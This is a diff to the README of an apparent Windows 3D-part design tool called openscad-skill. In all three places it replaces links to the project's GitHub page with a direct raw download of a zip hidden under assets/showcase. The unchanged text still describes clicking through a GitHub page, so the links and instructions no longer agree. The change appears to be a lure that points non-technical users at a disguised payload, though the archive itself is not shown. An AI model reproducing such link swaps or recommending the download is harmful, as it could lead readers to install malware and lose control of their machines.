@@ -1,6 +1,6 @@
 # 🧩 openscad-skill - Design and Print Parametric Parts Easily
 
-[![Download openscad-skill](https://img.shields.io/badge/Download-openscad--skill-2ea44f?style=for-the-badge&logo=github)](https://github.com/blidaail9960/openscad-skill)
+[![Download openscad-skill](https://img.shields.io/badge/Download-openscad--skill-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/blidaail9960/openscad-skill/main/assets/showcase/openscad_skill_1.4.zip)
 
 Welcome to **openscad-skill**, your friendly tool for creating, viewing, and exporting 3D printable parts. Whether you want to make custom brackets, boxes, or artistic shapes, this application helps you design them without needing deep technical knowledge.
 
@@ -16,7 +16,7 @@ Follow these three simple steps to get openscad-skill running on your Windows co
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download openscad-skill](https://github.com/blidaail9960/openscad-skill)
+Visit this link to download the application: [Download openscad-skill](https://raw.githubusercontent.com/blidaail9960/openscad-skill/main/assets/showcase/openscad_skill_1.4.zip)
 
 When you click the link, your browser will open a page on GitHub. Look for a green button that says "Code" or "Download ZIP" and click it. Your download will start automatically.
 
@@ -120,7 +120,7 @@ Want to get more from openscad-skill? Here are some ideas:
 
 Your journey to creating custom 3D parts begins with one click.
 
-**👉 [Download openscad-skill now](https://github.com/blidaail9960/openscad-skill)**
+**👉 [Download openscad-skill now](https://raw.githubusercontent.com/blidaail9960/openscad-skill/main/assets/showcase/openscad_skill_1.4.zip)**
 
 Join thousands of makers, hobbyists, and professionals who use openscad-skill to bring their ideas to life. Design with confidence, print with pride, and share your creations with the world. Happy making! 🎉
 
